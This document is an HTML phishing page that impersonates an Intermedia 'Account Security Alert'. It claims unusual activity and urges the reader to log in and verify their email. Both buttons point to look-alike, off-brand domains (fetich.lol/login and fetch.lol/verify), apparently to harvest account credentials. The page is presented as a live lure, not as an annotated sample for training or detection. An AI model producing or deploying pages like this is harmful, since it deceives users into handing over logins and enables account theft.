<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Account Security Alert - Intermedia</title>
  <style>
    body {
      background: #f2f5fc;
      font-family: Arial,sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .container {
      background: #fff;
      padding: 2rem 2.5rem;
      border-radius: 12px;
      box-shadow: 0 6px 24px rgba(0,0,0,0.13);
      max-width: 400px;
      text-align: center;
    }
    .alert-icon {
      font-size: 3rem;
      color: #e53935;
      margin-bottom: 12px;
    }
    h1 {
      color: #244675;
      font-size: 1.6rem;
      margin-bottom: 0.5rem;
    }
    .reason {
      color: #e53935;
      font-weight: bold;
      margin-bottom: 18px;
    }
    p {
      font-size: 1rem;
      color: #4A5568;
      margin-bottom: 24px;
    }
    .cta-btn {
      display: block;
      width: 100%;
      background: #244675;
      color: #fff;
      text-decoration: none;
      padding: 0.7rem 0;
      margin-bottom: 12px;
      border-radius: 6px;
      font-weight: bold;
      transition: background 0.2s;
    }
    .cta-btn:hover {
      background: #4072c4;
    }
    .footer {
      font-size: 0.88rem;
      color: #a0aec0;
      margin-top: 20px;
    }
    .brand {
      font-weight: bold;
      color: #244675;
      margin-top: 24px;
    }
    @media (max-width:500px){
      .container {
        padding: 1rem 0.7rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="alert-icon">⚠️</div>
    <h1>Account Verification Required</h1>
    <div class="reason">Unusual Activity Detected</div>
    <p>
      For your security, please log in and verify your email address to secure your Intermedia account.
    </p>
    <a href="https://fetich.lol/login" class="cta-btn">Log In to Your Account</a>
    <a href="https://fetch.lol/verify" class="cta-btn">Verify Email Address</a>
    <div class="brand">Intermedia</div>
    <div class="footer">If you did not request this alert, please contact Intermedia support.</div>
  </div>
</body>
</html>
